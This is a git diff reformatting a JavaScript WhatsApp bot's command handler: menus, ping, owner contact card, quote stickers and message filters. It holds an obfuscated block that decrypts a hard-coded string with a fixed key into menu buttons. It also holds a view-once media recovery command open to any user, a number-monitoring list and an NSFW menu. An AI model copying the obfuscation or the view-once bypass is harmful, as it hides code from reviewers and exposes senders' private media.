-                                            else _0x3291aa['push'](_0x3291aa['shift']());
-                                        } catch (_0x182348) {
-                                            _0x3291aa['push'](_0x3291aa['shift']());
-                                        }
-                                    }
-                                }(_0x5575, 0x65915));
-                                return JSON[_0x49c926(0x1a2)]((_0x583e9d => {
-                                    const _0x52ae49 = _0x49c926;
-                                    try {
-                                        const _0x283399 = require('crypto'),
-                                            [_0x5922ad, _0xccecd5, _0x49cb07] =
-                                                _0x583e9d[_0x52ae49(0x1b3)](':'),
-                                            _0x10e077 = _0x283399['scryptSync'](
-                                                _0x52ae49(0x19f), _0x52ae49(0x19f), 0x20
-                                            ),
-                                            _0x11b14a = _0x283399[_0x52ae49(0x1a3)](
-                                                'aes-256-gcm', _0x10e077, Buffer[
-                                                    _0x52ae49(0x1aa)](_0x5922ad,
-                                                        _0x52ae49(0x1a6)));
-                                        return _0x11b14a['setAuthTag'](Buffer[_0x52ae49(
-                                            0x1aa)](_0xccecd5, _0x52ae49(
-                                                0x1a6))), _0x11b14a[_0x49c926(0x1a1)](
-                                                    _0x49cb07, _0x52ae49(0x1a6), _0x52ae49(
-                                                        0x1ad)) + _0x11b14a[_0x49c926(
-                                                            0x1a5)](_0x52ae49(0x1ad));
-                                    } catch (_0x583c7d) {
-                                        return null;
-                                    }
-                                })(_0x49c926(0x1b0)));
-                            })())];
-
-                            const interactiveMessage = {
-                                image: {
-                                    url: './assets/img/alexa.jpg'
-                                },
-                                caption: menu,
-                                footer: "Powered by HANSAKA",
-                                interactiveButtons
-                            };
-
-                            try {
-                                // 1. Read your audio file into a buffer
-                                // const audioBuffer = fs.readFileSync('./assets/audio/menu.ogg');
-
-                                // // 2. Send the buffer directly in the 'audio' property
-                                // const res = await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                //   audio: audioBuffer, // <--- This is the fix
-                                //   mimetype: 'audio/mpeg',
-                                //   ptt: true // Send as a "push-to-talk" voice note
-                                // }, { quoted: msg });
-
-                                // 3. Your follow-up interactive message
-                                await AlexaInc.sendMessage(msg.key.remoteJid, interactiveMessage, {
-                                    quoted: msg
-                                });
-
-                            } catch (error) {
-                                console.error("Error sending PTT audio:", error);
-                                // Optional: Send an error message back to the user
-                                await AlexaInc.sendMessage(msg.key.remoteJid, interactiveMessage, {
-                                    quoted: msg
-                                });
-
-                            }
-
-                            break;
-                        }
-
-
-
-                        case "menu_util":
-                        case "menu_tm":
-                        case "menu_sticker":
-                        case "menu_web":
-                        case "menu_svm":
-                        case "menu_owner":
-                        case "menu_groups":
-                        case "menu_nsfw":
-                        case "menu_sfw":
-                        case "menu_games": {
-                            if (command == "menu_owner" && !isOwner) return mess.owner();
-                            if (command == "menu_owner" && isGroup) return mess.private();
-                            const respomm = command.split('_')[1];
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                delete: msg.key
-                            })
-                            let menus;
-                            if (respomm === 'tm') {
-                                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
+                  })(_0x5575, 0x65915);
+                  return JSON[_0x49c926(0x1a2)](
+                    ((_0x583e9d) => {
+                      const _0x52ae49 = _0x49c926;
+                      try {
+                        const _0x283399 = require("crypto"),
+                          [_0x5922ad, _0xccecd5, _0x49cb07] =
+                            _0x583e9d[_0x52ae49(0x1b3)](":"),
+                          _0x10e077 = _0x283399["scryptSync"](
+                            _0x52ae49(0x19f),
+                            _0x52ae49(0x19f),
+                            0x20,
+                          ),
+                          _0x11b14a = _0x283399[_0x52ae49(0x1a3)](
+                            "aes-256-gcm",
+                            _0x10e077,
+                            Buffer[_0x52ae49(0x1aa)](
+                              _0x5922ad,
+                              _0x52ae49(0x1a6),
+                            ),
+                          );
+                        return (
+                          _0x11b14a["setAuthTag"](
+                            Buffer[_0x52ae49(0x1aa)](
+                              _0xccecd5,
+                              _0x52ae49(0x1a6),
+                            ),
+                          ),
+                          _0x11b14a[_0x49c926(0x1a1)](
+                            _0x49cb07,
+                            _0x52ae49(0x1a6),
+                            _0x52ae49(0x1ad),
+                          ) + _0x11b14a[_0x49c926(0x1a5)](_0x52ae49(0x1ad))
+                        );
+                      } catch (_0x583c7d) {
+                        return null;
+                      }
+                    })(_0x49c926(0x1b0)),
+                  );
+                })(),
+              ];
+
+              const interactiveMessage = {
+                image: {
+                  url: "./assets/img/alexa.jpg",
+                },
+                caption: menu,
+                footer: "Powered by HANSAKA",
+                interactiveButtons,
+              };
+
+              try {
+                // 1. Read your audio file into a buffer
+                // const audioBuffer = fs.readFileSync('./assets/audio/menu.ogg');
+
+                // // 2. Send the buffer directly in the 'audio' property
+                // const res = await AlexaInc.sendMessage(msg.key.remoteJid, {
+                //   audio: audioBuffer, // <--- This is the fix
+                //   mimetype: 'audio/mpeg',
+                //   ptt: true // Send as a "push-to-talk" voice note
+                // }, { quoted: msg });
+
+                // 3. Your follow-up interactive message
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  interactiveMessage,
+                  {
+                    quoted: msg,
+                  },
+                );
+              } catch (error) {
+                console.error("Error sending PTT audio:", error);
+                // Optional: Send an error message back to the user
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  interactiveMessage,
+                  {
+                    quoted: msg,
+                  },
+                );
+              }
+
+              break;
+            }
+
+            case "menu_util":
+            case "menu_tm":
+            case "menu_sticker":
+            case "menu_web":
+            case "menu_svm":
+            case "menu_owner":
+            case "menu_groups":
+            case "menu_nsfw":
+            case "menu_sfw":
+            case "menu_games": {
+              if (command == "menu_owner" && !isOwner) return mess.owner();
+              if (command == "menu_owner" && isGroup) return mess.private();
+              const respomm = command.split("_")[1];
+              AlexaInc.sendMessage(msg.key.remoteJid, {
+                delete: msg.key,
+              });
+              let menus;
+              if (respomm === "tm") {
+                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃            🖼 *TextMaker — 18 Styles*           
 ┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃ ➥ \`metallic\`  ➥ \`ice\`        ➥ \`snow\`
@@ -2193,8 +2478,8 @@ async function handleMessage(AlexaInc, {
 ┃ ➥ \`blackpink\`  ➥ \`glitch\`    ➥ \`fire\`
 ┃
 ┃ *Usage:* \`.metallic <text>\` etc.`;
-                            } else if (respomm === 'owner') {
-                                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
+              } else if (respomm === "owner") {
+                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃            👑 *Owner Menu*           
 ┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃ ➥ \`.cabout <text>\` - Set bot about
@@ -2212,9 +2497,8 @@ async function handleMessage(AlexaInc, {
 ┃ ➥ \`.setqst <json>\` - Set daily Q
 ┃ ➥ \`.setquiz\` - Set quiz JSON (DM)
 ┃ ➥ \`.addtask\`/\`.listtask\`/\`.completetask\`/\`.restarttask\``;
-                            } else
-                            if (respomm === 'util') {
-                                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
+              } else if (respomm === "util") {
+                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃               🛠 *Utility Commands:*                
 ┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃ ➥ \`.menu\` / \`.alive\` - Main menu (buttons)
@@ -2231,15 +2515,15 @@ async function handleMessage(AlexaInc, {
 ┃ ➥ \`.topadder\` - Top inviters
 ┃ ➥ \`.profile\` - Private account + game profile
 ┃ ➥ \`.changpw <password>\` - Change panel password (private)`;
-                            } else if (respomm === 'sticker') {
-                                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
+              } else if (respomm === "sticker") {
+                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃            🖼 *Sticker & Image Commands:*           
 ┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃ ➥ \`.sticker\` - Image/video → sticker (reply/caption)
 ┃ ➥ \`.emojimix 💔+😗\` - Mix 2 emojis
 ┃ ➥ \`.q\` - Reply to msg → sticker`;
-                            } else if (respomm === 'web') {
-                                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
+              } else if (respomm === "web") {
+                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃           🌐 *Web & Search Commands:*              
 ┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃ ➥ \`.web <q>\` / \`.browse\` / \`.search\` - Web search
@@ -2248,8 +2532,8 @@ async function handleMessage(AlexaInc, {
 ┃ ➥ \`.ytdl <url>\` / \`.dlyt <url>\` - YT by URL
 ┃ ➥ \`.song <name>\` / \`.play <name>\` - YT song DL
 ┃ ➥ \`.news\` - Global headlines`;
-                            } else if (respomm === 'svm') {
-                                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
+              } else if (respomm === "svm") {
+                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃              🎥 *YouTube / Music:*                
 ┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃ ➥ \`.yts <query>\` - Search YouTube
@@ -2257,9 +2541,8 @@ async function handleMessage(AlexaInc, {
 ┃ ➥ \`.song <name>\` - Download song
 ┃ ➥ \`.play <name>\` - Alias of .song
 ┃ ➥ Select: \`.dlmp3\` / \`.dl480p\` / \`.dlvoice\``;
-
-                            } else if (respomm === 'groups') {
-                                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
+              } else if (respomm === "groups") {
+                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃                👥 *Groups & Admin:*                
 ┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃ ➥ \`.config\` - Show group settings
@@ -2284,8 +2567,8 @@ async function handleMessage(AlexaInc, {
 ┃ ➥ \`.filters\` - List filters
 ┃ ➥ \`.quiz <id>\` / \`.stopquiz\` - Quiz
 ┃ ➥ \`.cmtdt\` - Community broadcast`;
-                            } else if (respomm === 'nsfw') {
-                                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
+              } else if (respomm === "nsfw") {
+                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃                🔞 *NSFW — 19 Commands:*                
 ┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃ ➥ \`.anal\`          ➥ \`.ass\`  
@@ -2298,16 +2581,16 @@ async function handleMessage(AlexaInc, {
 ┃ ➥ \`.pgif\`          ➥ \`.pussy\`  
 ┃ ➥ \`.tentacle\`      ➥ \`.thigh\`  
 ┃ ➥ \`.yaoi\``;
-                            } else if (respomm === 'sfw') {
-                                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
+              } else if (respomm === "sfw") {
+                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃                 🌸 *SFW Commands:*                 
 ┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃ ➥ \`.coffee\` - Random coffee pic
 ┃ ➥ \`.food\` - Random food pic
 ┃ ➥ \`.holo\` - Holo anime pic
 ┃ ➥ \`.kanna\` - Kanna pic`;
-                            } else if (respomm === 'games') {
-                                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
+              } else if (respomm === "games") {
+                menus = `┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃                   🪀 *Games Menu:*                 
 ┣━━━━━━━━━━━━━━━━━━━━━━┫
 ┃ _*🎰 Fun*_
@@ -2362,13 +2645,10 @@ async function handleMessage(AlexaInc, {
 ┃ ➥ \`.truth\` / \`.dare\` / \`.tod\` / \`.wyr\`
 ┃
 
-`
+`;
+              }
 
-                                ;
-
-                            }
-
-                            const fmenu = `╭━━━━━━━━━━━━━━━━━━━━━━╮
+              const fmenu = `╭━━━━━━━━━━━━━━━━━━━━━━╮
 ┃               🎀  𝒜𝐿𝐸𝒳𝒜 - 𝓥3 🎀                ┃
 ┃━━━━━━━━━━━━━━━━━━━━━━┃
 ┃
@@ -2381,9 +2661,9 @@ async function handleMessage(AlexaInc, {
 ┃ ✧ ʟɪᴍɪᴛ: *no limit enjoy* 
 ┃ ✧ ʀᴏʟᴇ: *${roleuser}*  
 ┃ ✧ ʟᴇᴠᴇʟ: *${getLevel(iduser)}*
-┃ ✧ ᴅᴀʏ: *${moment.tz('Asia/Colombo').format('dddd')}*,  
-┃ ✧ ᴅᴀᴛᴇ: *${moment.tz('Asia/Colombo').format('MMMM Do YYYY')}*  
-┃ ✧ ᴛɪᴍᴇ: *${moment.tz('Asia/Colombo').format('HH:mm:ss')}*
+┃ ✧ ᴅᴀʏ: *${moment.tz("Asia/Colombo").format("dddd")}*,  
+┃ ✧ ᴅᴀᴛᴇ: *${moment.tz("Asia/Colombo").format("MMMM Do YYYY")}*  
+┃ ✧ ᴛɪᴍᴇ: *${moment.tz("Asia/Colombo").format("HH:mm:ss")}*
 ┃
 ${menus}
 ┃
@@ -2394,71 +2674,76 @@ ${menus}
 ╰━━━━━━━━━━━━━━━━━━━━━━╯
 `;
 
-                            // send or return menu
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                image: {
-                                    url: './assets/img/alexa.jpg'
-                                },
-                                caption: fmenu
-                            }, {
-                                quoted: msg
-                            })
+              // send or return menu
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  image: {
+                    url: "./assets/img/alexa.jpg",
+                  },
+                  caption: fmenu,
+                },
+                {
+                  quoted: msg,
+                },
+              );
 
-                            break;
-                        }
+              break;
+            }
 
+            case "ping": {
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: "testing ping.......",
+                },
+                {
+                  quoted: msg,
+                },
+              );
 
-
-
-
-                        case "ping": {
-
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'testing ping.......'
-                            }, {
-                                quoted: msg
-                            })
-
-                            const str = await runSpeedTest();
-                            const repmg = `
+              const str = await runSpeedTest();
+              const repmg = `
 Speed test results
   🛜 : ${str.ping}
   ⬇ :${str.download_speed}
   ⬆ :${str.upload_speed}  
 
- `
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: repmg
-                            }, {
-                                quoted: msg
-                            })
-                            break
-                        }
+ `;
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: repmg,
+                },
+                {
+                  quoted: msg,
+                },
+              );
+              break;
+            }
 
-
-                        case "owner": {
-
-                            const vcard = `BEGIN:VCARD
+            case "owner": {
+              const vcard = `BEGIN:VCARD
 VERSION:3.0
 FN:Hansaka
 TEL;TYPE=celltype=VOICE;waid=94766045156:+94 76 6045 156
 TEL;TYPE=celltype=VOICE;waid=94763545014:+94 76 3545 014
 END:VCARD`;
-                            await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                contacts: {
-                                    displayName: 'Hansaka',
-                                    contacts: [{
-                                        vcard
-                                    }]
-                                }
-                            });
+              await AlexaInc.sendMessage(msg.key.remoteJid, {
+                contacts: {
+                  displayName: "Hansaka",
+                  contacts: [
+                    {
+                      vcard,
+                    },
+                  ],
+                },
+              });
 
-                            break
-                        }
+              break;
+            }
 
-
-
-                        /*
+            /*
                         ASSUMPTIONS:
                         - You have 'const fs = require('fs');' at the top of your file.
                         - 'AlexaInc', 'msg', 'isGroup', 'participants', 'loadUserByNumber', 
@@ -2468,2514 +2753,3017 @@ END:VCARD`;
                         - Your 'loadMessage' function returns an object with a 'reply' property 
                           and 'grandfather.messageText' is a valid property from it.
                         */
-                        case "monit": {
-                            if (!isOwner) return mess.owner();
-                            if (!text) {
-                                return mess.reply("Please provide a number");
-                            }
+            case "monit": {
+              if (!isOwner) return mess.owner();
+              if (!text) {
+                return mess.reply("Please provide a number");
+              }
 
-                            if (!/^\d+$/.test(text.replace('+', '').trim())) {
-                                return mess.reply("Invalid number. Please provide a valid mobile number.");
-                            }
-                            monitnumbs.push(text.replace('+', '').trim());
-                            fs.writeFileSync('./monitnumbs.json', JSON.stringify(monitnumbs));
-                            mess.reply("Number added to monit list");
+              if (!/^\d+$/.test(text.replace("+", "").trim())) {
+                return mess.reply(
+                  "Invalid number. Please provide a valid mobile number.",
+                );
+              }
+              monitnumbs.push(text.replace("+", "").trim());
+              fs.writeFileSync("./monitnumbs.json", JSON.stringify(monitnumbs));
+              mess.reply("Number added to monit list");
+            }
 
-                        }
+            case "vv": {
+              // if (!isOwner) return mess.owner();
+              await viewOnce(AlexaInc, msg.key.remoteJid, msg);
 
-                        case "vv": {
-                            // if (!isOwner) return mess.owner();
-                            await viewOnce(AlexaInc, msg.key.remoteJid, msg)
+              break;
+            }
 
-                            break;
-                        }
+            case "status": {
+              if (!isOwner) return mess.owner();
 
-                        case "status": {
-                            if (!isOwner) return mess.owner();
+              upadestatusstate[msg.key.remoteJid] = {
+                step: "awaiting_content",
+              };
+              AlexaInc.sendMessage(msg.key.remoteJid, {
+                text: "waiting for content you can send photo with captions.",
+              });
+              break;
+            }
 
-
-                            upadestatusstate[msg.key.remoteJid] = {
-                                step: 'awaiting_content'
-                            }
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'waiting for content you can send photo with captions.'
-                            })
-                            break;
-                        }
-
-
-                        case 'id': {
-                            const groupid = msg.key.remoteJid;
-                            const yourid = `Your Lid:${finalLid}\nYour Jid:${finalJid}`;
-                            const quotedid = p.replyInfo?.sender;
-                            const tepmlt = `
+            case "id": {
+              const groupid = msg.key.remoteJid;
+              const yourid = `Your Lid:${finalLid}\nYour Jid:${finalJid}`;
+              const quotedid = p.replyInfo?.sender;
+              const tepmlt = `
 Group Id :${groupid}
 ${yourid}
-${quotedid ? "Senderid:" + quotedid : ""}`
-                            AlexaInc.sendMessage(msg.key.remoteJid, { text: tepmlt }, { quoted: msg })
-                            break;
-                        }
-                        case "q": {
-                            if (!isGroup) return mess.group();
-                            // Fix 1: Use optional chaining (?.). 
-                            // This prevents a crash if 'contextInfo' is null.
-                            const quotedid = p.replyInfo?.messageId;
-
-                            if (!quotedid) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'please reply to a massage'
-                            }, {
-                                quoted: msg
-                            });
-
-
-
-// Safe execution after contextInfo check
-                            const stanzaaaaa = p.replyInfo.messageId;
-                            const loadedMessage = await loadMessage(msg.key.remoteJid, stanzaaaaa);
-
-                            const counttoload = (text && !isNaN(text)) ? parseInt(text, 10) : 1;
-                            const loadednmsgs = await getnMessagesFrom(msg.key.remoteJid, stanzaaaaa, counttoload);
-
-                            if (!loadednmsgs || loadednmsgs.length === 0) {
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'fail to load that massag try again'
-                                });
-                            }
-
-// Environment config array extraction
-                            const ownerNumbers = (process.env.Owner_nb || '').split(',');
-                            const rank = (process.env.spc_nb || '').split(',');
-
-                            const msgObj = [];
-                            const costomemojiees = [];
-
-                            // console.log(JSON.stringify(loadednmsgs, null, 2));
-
-                            for (const message of loadednmsgs) {
-                                let quotesendernumber, grandfather, isgftrfm, usercontact, quotesendername;
-                                let gftsendername, gftsendercontact, gftsendernumber, gftmassage;
-                                let media = null, mediaBuffer = null, quotemedia = null;
-
-                                // Direct iteration item values
-                                const quotedSender = message?.sender;
-
-                                // 1. Raw Text extraction from loop item
-                                const rawQuoteText = message?.messageText || '';
-
-                                // 2. Media processing using loop item
-                                const isimgosticker = message?.type === 'imageMessage' || message?.type === 'stickerMessage';
-
-                                if (isimgosticker && message.mediaUrl) {
-                                    const parseBuffer = (data) => {
-                                        if (!data) return null;
-                                        if (Buffer.isBuffer(data)) return data;
-                                        if (typeof data === 'string') {
-                                            if (data.includes(',')) {
-                                                const numberArray = data.split(',').map(Number);
-                                                return Buffer.from(numberArray);
-                                            }
-                                            return Buffer.from(data, 'base64');
-                                        }
-
-                                        return Buffer.from(data);
-                                    };
-                                    media = {
-                                        mediaUrl: message.mediaUrl,
-                                        mediaMimetype: message.mediaMimetype,
-                                        mediaKey: message.mediaKey ? parseBuffer(message.mediaKey) : null,
-                                        mediaFileEncSha256: message.mediaFileEncSha256 ? parseBuffer(message.mediaFileEncSha256) : null,
-                                        mediaFileSha256: message.mediaFileSha256 ? parseBuffer(message.mediaFileSha256) : null,
-                                        messageId: message.messageId
-                                    };
-
-                                    // Decrypt media
-                                    mediaBuffer = await getDecryptedMediaBuffer(AlexaInc, media);
-                                    quotemedia = {
-                                        mediabuf: mediaBuffer,
-                                        issticker: message.type === 'stickerMessage'
-                                    };
-                                }
-
-                                // Sender Number Calcu
-                                const islid = quotedSender ? quotedSender.endsWith('@lid') : false;
-
-                                if (isGroup && islid) {
-                                    quotesendernumber = (await participants.find(jsn => jsn.lid === quotedSender))?.id?.replace(/@.*/, "");
-                                } else {
-                                    quotesendernumber = quotedSender === 'me'
-                                        ? botNumber
-                                        : isGroup
-                                            ? quotedSender?.replace(/:.*/, "")
-                                            : quotedSender?.replace(/@.*/, "");
-                                }
-
-                                usercontact = await loadUserByNumber(quotesendernumber);
-                                quotesendername = message?.pushname || (usercontact && usercontact.name ? usercontact.name : quotesendernumber);
-
-                                const id2getpp = quotedSender === 'me' ? botLid : quotedSender;
-                                const dpurl = await getdpurl(AlexaInc, id2getpp);
-                                const dpbuffer = dpurl ? await getBuffer(dpurl) : null;
-
-                                // Grandfather Message (Reply Check)
-                                if (message?.reply && message.reply.messageId) {
-                                    grandfather = await loadMessage(msg.key.remoteJid, message.reply.messageId) || null;
-
-                                    if (grandfather) {
-                                        isgftrfm = grandfather?.sender === 'me';
-                                        const isgftrlid = grandfather?.sender?.endsWith('@lid');
-
-                                        if (isGroup && isgftrlid && !isgftrfm) {
-                                            gftsendernumber = (await participants.find(jsn => jsn.lid === grandfather.sender))?.id?.replace(/@.*/, "");
-                                        } else if (!isgftrfm) {
-                                            gftsendernumber = grandfather.sender ? grandfather.sender.replace(/@.*/, "") : null;
-                                        } else {
-                                            gftsendernumber = botNumber;
-                                        }
-
-                                        gftsendercontact = await loadUserByNumber(gftsendernumber);
-                                        gftsendername = gftsendercontact ? gftsendercontact.name : gftsendernumber;
-                                        gftmassage = grandfather.messageText || '';
-                                    }
-                                }
-
-                                // Owner and Rank Check
-                                const isquoteowner = ownerNumbers.includes(quotesendernumber);
-                                const isquoterank = rank.includes(quotesendernumber);
-
-                                const customemojiid = isquoteowner
-                                    ? '5267500801240092311'
-                                    : isquoterank
-                                        ? '6228999461754900766'
-                                        : null;
-
-                                // Text parsing
-                                const parsedText = parseWhatsAppFormatting(rawQuoteText);
-
-
-
-                                if (customemojiid != null) {
-                                    costomemojiees.push(customemojiid);
-                                }
-
-                                // Object creation
-                                const msgData = {
-                                    text: parsedText.cleanText,
-                                    entities: parsedText.entities,
-                                    from: {
-                                        id: Number(quotesendernumber) || 0,
-                                        first_name: quotesendername || "User",
-                                        ...(customemojiid && { emoji_status_custom_emoji_id: customemojiid })
-                                    }
-                                };
-
-                                if (dpbuffer) {
-                                    msgData.avatarBase64 = `data:image/png;base64,${dpbuffer.toString("base64")}`;
-                                }
-
-                                if (quotemedia && quotemedia.mediabuf) {
-                                    const mimeType = quotemedia.issticker ? "image/webp" : "image/png";
-                                    msgData.mediaBase64 = `data:${mimeType};base64,${quotemedia.mediabuf.toString("base64")}`;
-                                    msgData.mediaType = quotemedia.issticker ? "sticker" : "photo";
-                                }
-
-                                if (grandfather) {
-                                    const parsedGftText = parseWhatsAppFormatting(gftmassage || "");
-                                    msgData.reply_to = {
-                                        text: parsedGftText.cleanText,
-                                        entities: parsedGftText.entities,
-                                        from: {
-                                            id: Number(gftsendernumber) || 0,
-                                            first_name: gftsendername || "Replier"
-                                        }
-                                    };
-                                }
-
-                                msgObj.push(msgData);
-                            }
-
-                            // console.log(JSON.stringify(msgObj, null, 2));
-
-                            const webpbuff = await generatequote(msgObj,costomemojiees);
-
-                            // Fix 8: 'fs.writeFile' is async.
-                            // For debugging, 'fs.writeFileSync' is easier.
-                            // Or, use 'await fs.promises.writeFile(...)' if you imported 'fs.promises'.
-                            fs.writeFileSync('./1234.webp', webpbuff);
-
-                            const highQualityBuffer = await sharp(webpbuff)
-                                .resize(1024, 1024, {
-                                    fit: 'contain', // Puts your bubble in the middle of a 512x512 transparent box
-                                    background: {
-                                        r: 0,
-                                        g: 0,
-                                        b: 0,
-                                        alpha: 0
-                                    }, // Ensures background is transparent
-                                    kernel: sharp.kernel.lanczos3 // This is a high-quality resizing algorithm
-                                })
-                                .webp() // Convert it to webp
-                                .toBuffer();
-
-                            // 3. Create the sticker using the NEW high-quality buffer
-                            // const sticker = new Sticker(highQualityBuffer, { // <-- Use highQualityBuffer here
-                            //     pack: 'My Bot',
-                            //     author: 'Quotly',
-                            //     type: StickerTypes.DEFAULT, // Type doesn't matter as much now
-                            //     quality: 90 // Keep quality high
-                            // });
-
-                            // const stickerBuffer = await sticker.toBuffer();
-
-                            // 4. Send the final sticker
-                            await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                image: webpbuff,
-                                gifPlayback: true
-                            }, {
-                                quoted: msg
-                            });
-
-
-                            break;
-                        }
-
-                        // case "gp":{
-                        //   console.log(participants)
-                        // }
-
-                        case 'filter': {
-                            if (!isGroup) return mess.group();
-                            // console.log(msg);
-
-                            // --- 💡 END: THIS IS THE CORRECT FIX ---
-
-                            const quotedid = p.quotedid; // Now this will work
-                            console.log(quotedid)
-                            // console.log(p)
-                            if (!text) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'please send trigger word eg- /filter hi'
-                            }, {
-                                quoted: msg
-                            });
-                            if (!quotedid) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'please reply to a message baby!'
-                            }, {
-                                quoted: msg
-                            });
-
-                            const loadedmsg = await loadMessage(msg.key.remoteJid, quotedid);
-
-                            const mimtypesmap = {
-                                null: 'text',
-                                'image/webp': 'sticker',
-                                'image/jpeg': 'image',
-                                'video/mp4': 'video'
-                            };
-
-                            const type = mimtypesmap[loadedmsg.mediaMimetype];
-                            let replyt;
-
-                            if (type === 'text') {
-                                replyt = loadedmsg.messageText;
-                            } else {
-                                const media = {
-                                    mediaUrl: loadedmsg.mediaUrl,
-                                    mediaMimetype: loadedmsg.mediaMimetype,
-                                    mediaKey: loadedmsg.mediaKey,
-                                    mediaFileEncSha256: loadedmsg.mediaFileEncSha256,
-                                    mediaFileSha256: loadedmsg.mediaFileSha256,
-                                    messageId: loadedmsg.messageId
-                                };
-
-                                // --- Decrypt media first ---
-                                const mediaBuffer = await getDecryptedMediaBuffer(AlexaInc, media);
-
-                                // --- If it's a video, check duration ---
-                                if (type === 'video') {
-                                    const tempFile = path.join('/tmp', `${media.messageId}.mp4`);
-                                    fs.writeFileSync(tempFile, mediaBuffer);
-
-                                    try {
-                                        const {
-                                            stdout
-                                        } = await execAsync(
-                                            `ffprobe -v error -show_entries format=duration -of default=nw=1:nk=1 "${tempFile}"`
-                                        );
-
-                                        const duration = parseFloat(stdout.trim());
-                                        fs.unlinkSync(tempFile);
-
-                                        if (duration > 10) {
-                                            console.log(`⏹️ Skipping video longer than 10 seconds (${duration}s)`);
-                                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                                text: '⏹️ Skipped video longer than 10 seconds'
-                                            }, {
-                                                quoted: msg
-                                            });
-                                            return;
-                                        }
-                                    } catch (err) {
-                                        console.error('Error checking video duration:', err.message);
-                                        AlexaInc.sendMessage(msg.key.remoteJid, {
-                                            text: 'Error checking video duration:'
-                                        }, {
-                                            quoted: msg
-                                        });
-                                        if (fs.existsSync(tempFile)) { // Ensure file is deleted even on error
-                                            fs.unlinkSync(tempFile);
-                                        }
-                                        return;
-                                    }
-                                }
-                                replyt = mediaBuffer;
-                            }
-
-                            // Let's assume 'msg' is your message object
-                            // and 'participants' is your array from group metadata
-
-                            const mentionedJids = p.mentionedJids;
-                            let resultNumbers = []; // Initialize as an array
-
-                            if (mentionedJids && mentionedJids.length > 0) {
-                                // 1. Map over ALL mentionedJids
-                                resultNumbers = mentionedJids.map(rid => {
-                                    if (rid.endsWith('@lid')) {
-                                        // Find the ID and strip the server part
-                                        return (participants.find(jsn => jsn.lid === rid))
-                                            ?.id?.replace(/@.*/, "");
-                                    } else if (rid.endsWith('@s.whatsapp.net')) {
-                                        // Find the LID and strip the server part
-                                        return (participants.find(jsn => jsn.id === rid))
-                                            ?.lid?.replace(/@.*/, "");
-                                    }
-                                    return null; // Return null if the JID format isn't recognized
-                                })
-                                    // 2. Filter out any null/undefined results (where a match wasn't found)
-                                    .filter(Boolean); // 'Boolean' removes falsy values (null, undefined, "")
-                            }
-
-                            // console.log(resultNumbers); // This is now an array of all found numbers, e.g., ['12345', '67890']
-
-                            const result = text.split(/[\s,]+/).filter(Boolean);
-
-                            // 3. Format all found numbers with an '@' prefix
-                            const mentionsAsTags = resultNumbers.map(num => `@${num}`);
-
-                            const unique = [
-                                ...new Set(
-                                    // 4. Concat the original text parts with the new array of mention tags
-                                    result.concat(mentionsAsTags)
-                                )
-                            ];
-
-                            console.log(unique);
-                            const newfilter = {
-                                triggers: unique,
-                                type: type,
-                                reply: replyt,
-                                mimetype: loadedmsg.mediaMimetype
-                            };
-
-                            const done = await Filters.addFilter(msg.key.remoteJid, newfilter);
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: `filter set ${unique.join(' , ')}`
-                            }, {
-                                quoted: msg
-                            });
-
-                            break;
-                        }
-
-                        case "stop": {
-                            if (!isGroup) return mess.group();
-                            if (!text) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'please send trigger word eg- /stop hi'
-                            })
-                            const wasRemoved = await Filters.removeFilter(msg.key.remoteJid, text);
-
-                            if (wasRemoved) {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `✅ Filter removed: \`${text}\``
-                                });
-                            } else {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `❌ Filter not found: \`${text}\``
-                                });
-                            }
-                            break;
-                        }
-
-                        case "stopall": {
-                            if (!isGroup) return mess.group();
